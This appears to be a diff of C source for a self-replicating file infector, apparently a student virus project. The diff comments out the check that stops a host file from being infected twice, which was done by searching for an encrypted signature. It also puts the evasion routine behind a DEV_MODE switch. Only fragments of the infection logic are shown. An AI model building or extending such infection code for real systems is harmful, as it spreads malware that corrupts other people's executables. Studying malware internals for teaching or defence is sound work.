@@ -139,17 +139,17 @@ static int	inject(t_data *data) {
 	return 0;
 }
 
-static int	already_patched(t_data *data)
-{
-	char signature[26] = "\x53\x1d\x27\x16\xd7\x1c\x17\xb6\x76\x55\x25\x1b\xdc\x1d\x17\xfc\x6c\x5c\x2e\x07\xcb\x01\x55\xe6\x7e\x00";
-
-	encrypt((uint8_t *)signature, sizeof(signature) - 1, DEFAULT_KEY);
-
-	if (search_signature(data, signature) != NULL) {
-		return 1;
-	}
-	return 0;
-}
+//static int	already_patched(t_data *data)
+//{
+//	char signature[26] = "\x53\x1d\x27\x16\xd7\x1c\x17\xb6\x76\x55\x25\x1b\xdc\x1d\x17\xfc\x6c\x5c\x2e\x07\xcb\x01\x55\xe6\x7e\x00";
+//
+//	encrypt((uint8_t *)signature, sizeof(signature) - 1, DEFAULT_KEY);
+//
+//	if (search_signature(data, signature) != NULL) {
+//		return 1;
+//	}
+//	return 0;
+//}
 
 static int	infect(const char *filename, const char *self_name)
 {
@@ -175,11 +175,11 @@ static int	infect(const char *filename, const char *self_name)
 		return 1;
 	}
 
-	if (already_patched(&data) != 0) {
-		free_data(&data);
-		return 1;
-	}
-
+	//if (already_patched(&data) != 0) {
+	//	free_data(&data);
+	//	return 1;
+	//}
+	//
 	if (inject(&data) != 0) {
 		free_data(&data);
 		return 1;
@@ -298,9 +298,11 @@ static void open_file(const char *file, const char *self_path, uint16_t *counter
 
 void	famine(void)
 {
+#ifndef DEV_MODE
 	if (pestilence() != 0) {
 		return ;
 	}
+#endif
 
 	uint16_t counter = 0;
 	char host_name[PATH_MAX];
